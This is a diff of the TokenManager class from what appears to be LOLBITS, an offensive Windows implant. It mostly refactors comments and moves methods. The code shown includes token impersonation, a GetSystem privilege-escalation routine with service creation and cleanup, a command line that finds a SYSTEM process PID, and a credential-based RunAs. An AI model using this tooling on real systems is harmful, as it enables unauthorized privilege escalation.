@@ -10,8 +10,8 @@ namespace LOLBITS.TokenManagement
     public class TokenManager
     {
         public static IntPtr Token; 
-        public static int Method; // 1 = CreateProcessAsUser ; 2 = CreateProcessWithToken ; RunAs with valid credentials
-        public static readonly string[] Credentials = new string[3]; // 1 = Username ; 2 = Domain ('.' for local) ; 3 = Password 
+        public static int Method; // 1 = CreateProcessAsUser ; 2 = CreateProcessWithToken ; 3 = RunAs with valid credentials
+        public static readonly string[] Credentials = new string[3]; // [1] = Username ; [2] = Domain ('.' for local domain) ; [3] = Password 
         private static string _pipeName;
         private const int NumThreads = 1;
         private readonly SysCallManager sysCall;
@@ -28,6 +28,8 @@ namespace LOLBITS.TokenManagement
             Token = IntPtr.Zero;
             Method = 0;
         }
+
+        /////////////////////////// Impersonation ///////////////////////////
 
         public bool Impersonate (int pid)
         {
@@ -101,20 +103,11 @@ namespace LOLBITS.TokenManagement
             return false;
         }
 
-        private int getSystemPID()
-        {
-            string cmd = "FOR /F \"tokens=1,2,3,4,5\" %A in ('\"query process system | findstr svchost.exe | findstr/n ^^| findstr /b \"^1:\"\"') DO echo %E | findstr /b /r \"[0-9]\"";
-            string pid = Utils.ExecuteCommand(cmd);
-            string[] spl = pid.Split('\n');
-
-            return int.Parse(spl[2]);
-        }
-
         public bool GetSystem()
         {
 
 
-            int pid = getSystemPID();
+            int pid = Utils.getSystemPID();
 
             if (Impersonate(pid))
                 return true;
@@ -138,13 +131,20 @@ namespace LOLBITS.TokenManagement
                     exit = true;
             }
 
-            if (Token != IntPtr.Zero)           
+            if (Token != IntPtr.Zero)
                 return true;
 
             cmd = "sc delete NewDefaultService2";
             Utils.ExecuteCommand(cmd);
 
             return false;
+        }
+
+        public static bool RunAs(string domain, string user, string password)
+        {
+            Utils.RunAs(domain, user, password);
+
+            return Method == 3;
         }
 
         private static void ServerThread(object data)
@@ -180,11 +180,5 @@ namespace LOLBITS.TokenManagement
             }
         }
 
-        public static bool RunAs(string domain, string user, string password)
-        {
-            Utils.RunAs(domain, user, password);
-
-            return Method == 3;
-        }
     }
 }
